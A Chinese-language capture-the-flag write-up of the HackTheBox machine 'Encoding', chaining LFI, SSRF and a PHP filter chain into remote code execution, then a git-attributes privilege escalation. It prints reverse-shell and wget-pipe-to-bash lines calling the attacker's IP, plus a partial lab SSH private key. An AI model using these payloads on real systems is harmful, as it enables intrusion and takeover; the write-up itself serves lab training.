---
title: Encoding - HackTheBox
url: https://darkwing.moe/2023/02/02/Encoding-HackTheBox/
source: 喵喵喵喵
date: 2023-02-03
fetch_date: 2025-10-04T05:32:41.321158
---

# Encoding - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Encoding - HackTheBox

# Encoding - HackTheBox

##### 2023-02-02

#### TOC

1. [1. 基本信息](#基本信息)
   1. [1.1. 10.10.11.198](#10-10-11-198)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
3. [3. 子域名扫描](#子域名扫描)
   1. [3.1. image.haxtables.htb](#image-haxtables-htb)
4. [4. api.haxtables.htb](#api-haxtables-htb)
   1. [4.1. LFI](#LFI)
   2. [4.2. image .git](#image-git)
5. [5. image.haxtables.htb](#image-haxtables-htb-1)
   1. [5.1. actions/action\_handler.php](#actions-action-handler-php)
   2. [5.2. handler.php](#handler-php)
   3. [5.3. SSRF + LFI](#SSRF-LFI)
6. [6. LFI to RCE](#LFI-to-RCE)
7. [7. svc](#svc)
8. [8. user flag](#user-flag)
   1. [8.1. svc\_id\_rsa](#svc-id-rsa)
9. [9. 提权 & root flag](#提权-amp-root-flag)
   1. [9.1. shadow](#shadow)
10. [10. 参考资料](#参考资料)

# Encoding - HackTheBox

2023-02-02

# 基本信息

* <https://www.hackthebox.com/home/machines/profile/526>
* ## 10.10.11.198

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020201.jpg)

# 端口扫描

22和80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.198 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-02 13:38 CST Nmap scan report for 10.10.11.198 Host is up (0.096s latency). Not shown: 998 closed tcp ports (conn-refused) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA) |_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519) 80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu)) |_http-server-header: Apache/2.4.52 (Ubuntu) |_http-title: HaxTables Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 33.02 seconds ``` |

## 80

API中得到域名信息：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020202.jpg)

# 子域名扫描

根据得到的域名格式添加hosts，继续探测子域名：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.198 haxtables.htb api.haxtables.htb ``` |

发现另一个image：

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://haxtables.htb/" -H 'Host: FUZZ.haxtables.htb' -fs 1999  api                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 111ms] image                   [Status: 403, Size: 284, Words: 20, Lines: 10, Duration: 95ms] ``` |

## image.haxtables.htb

添加hosts，直接访问是403:

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020203.jpg)

# api.haxtables.htb

根据给出的api调用代码调用api，发现一个读取远程文件的调用方式，这里可以LFI：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020204.jpg)

## LFI

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020205.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020206.jpg)

## image .git

一步步读文件,utils里发现git：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` file:///var/www/html/index.php file:///var/www/image/index.php file:///var/www/image/utils.php ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020207.jpg)

# image.haxtables.htb

通过git dump代码,但因为image的403限制，需要改下工具代码：

* GitTools/Dumper at master · internetwache/GitTools
  <https://github.com/internetwache/GitTools/tree/master/Dumper>

修改后的版本：

* gitdumper to download .git directory only for HackTheBox “Encoding” machine
  <https://gist.github.com/EmmanuelCruzL/e309615e2951079e25b8bba7a13e8385>

然后dump git信息：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` ./gitdumper.sh http://image.haxtables.htb/.git/ image_git_dump ``` |

git信息的到的一些文件名，继续使用前面的LFI读代码：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020208.jpg)

## actions/action\_handler.php

action\_handler中发现LFI：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 ``` | ``` <?php  include_once 'utils.php';  if (isset($_GET['page'])) {     $page = $_GET['page'];     include($page);  } else {     echo jsonify(['message' => 'No page specified!']); }  ?> ``` |

## handler.php

主站的handler中发现SSRF，接收到的uri\_path会进入make\_api\_call,拼接在中间，所以也需要处理一下：

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` file:///var/www/html/handler.php file:///var/www/api/utils.php ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020209.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020210.jpg)

## SSRF + LFI

所以可以通过handler的SSRF去调用image的LFI：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020211.jpg)

# LFI to RCE

参考资料，和Pollution那台类似：

* hxp CTF 2021 - The End Of LFI? - 跳跳糖
  <https://tttang.com/archive/1395/>
* synacktiv/php\_filter\_chain\_generator
  <https://github.com/synacktiv/php_filter_chain_generator>

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` # m bash -i >& /dev/tcp/10.10.14.7/4444 0>&1  python3 php_filter_chain_generator.py --chain '<?=`wget -O - 10.10.14.7/m|bash`?>' ``` |

然后替换page参数，得到shell：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020212.jpg)

# svc

得到的www shell可以以svc用户权限运行git-commit.sh：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020213.jpg)

根据代码，用于git commit，可以通过附加Attribute执行其他操作：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020214.jpg)

* Git - Git Attributes
  <https://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes>

我们可以在/var/www/image文件夹中初始化一个新的版本库，为所有.php文件设置缩进过滤器，设置一个运行bash文件的命令来生成反向shell，最后，以svc用户身份运行git-commit.sh文件。

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 ``` | ``` #/tmp/shell #!/bin/bash bash -i >& /dev/tcp/10.10.14.7/4444 0>&1  chmod +x /tmp/shell  cd /var/www/image git init echo '*.php filter=indent' > .git/info/attributes git config filter.indent.clean /tmp/shell sudo -u svc /var/www/image/scripts/git-commit.sh ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020215.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020216.jpg)

# user flag

svc用户目录里可以获取私钥方便后续操作：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023020217.jpg)

## svc\_id\_rsa

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 ``` | ``` -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEAlnPbNrAswX0YLnW3sx1l7WN42hTFVwWISqdx5RUmVmXbdVgDXdzH /ZBNxIqqMXE8DWyNpzcV/78rkU4f2FF/rWH26WfFmaI/Zm9sGd5l4NTON2lxAOt+8aUyBR xpVYNSSK+CkahQ2XDO87IyS4HV4cKUYpaN/efa+XyoUm6mKiHUbtyUYGAfebSVxU4ur1Ue vSquljs+Hcpzh5WKRhgu/ojBDQdKWd0Q6bn75TfRBSu6u/mODjjilvVppGNWJWNrar8eSZ vbqMlV509E6Ud2rNopMelmpESZfBEGoJAvEnhFaYylsuC7IPEWMi82/3Vyl7RAgeT0zPjq nHiPCJykLYvxkvsRnIBFxesZL+AkbHYHEn3fyH16Pp8ZZmIIJN3WQD/SRJOTDh/fmWy6r7 oD+urq6+rEqTV0UGDk3YXhhep/LYnszZAZ2HNainM+iwtpDTr3rw+B+OH6Z8Zla1YvBFvL oQOAsqE2FUHeEpRspb57uDeKWbkrNLU5cYUhuWBLAAAFiEyJeU9MiXlPAAAAB3NzaC1yc2 EAAAGBAJZz2zawLMF9GC51t7MdZe1jeNoUxVcFiEqnceUVJlZl23VYA13cx/2QTcSKqjFx PA1sjac3Ff+/K5FOH9hRf61h9ulnxZmiP2ZvbBneZeDUzjdpcQDrfvGlMgUcaVWDUkivgp GoUNlwzvOyMkuB1eHClGKWjf3n2vl8qFJupioh1G7clGBgH3m0lcVOLq9VHr0qrpY7Ph3K c4eVikYYLv6IwQ0HSlndEOm5++U30QUrurv5jg444pb1aaRjViVja2q/Hkmb26jJVedPRO lHdqzaKTHpZqREmXwRBqCQLxJ4RWmMpbLguyDxFjIvNv91cpe0QIHk9Mz46px4jwicpC2L 8ZL7EZyARcXrGS/gJGx2BxJ938h9ej6fGWZiCCTd1kA/0kSTkw4f35lsuq+6A/rq6uvqxK k1dFBg5N2F4YXqfy2J7M2QGdhzWopzPosLaQ06968Pgfjh+mfGZWtWLwRby6EDgLKhNhVB 3hKUbKW+e7g3ilm5KzS1OXGFIblgSwAAAAMBAAEAAAGAF7nXhQ1NUYoHqTP5Ly7gpwn7wf BqmmmN76/uPyERtahEboHdrgymIS+DhA4V/swLm1ZWFFuUhYtBNJ3sWbGof9AmHvK1b5/t ...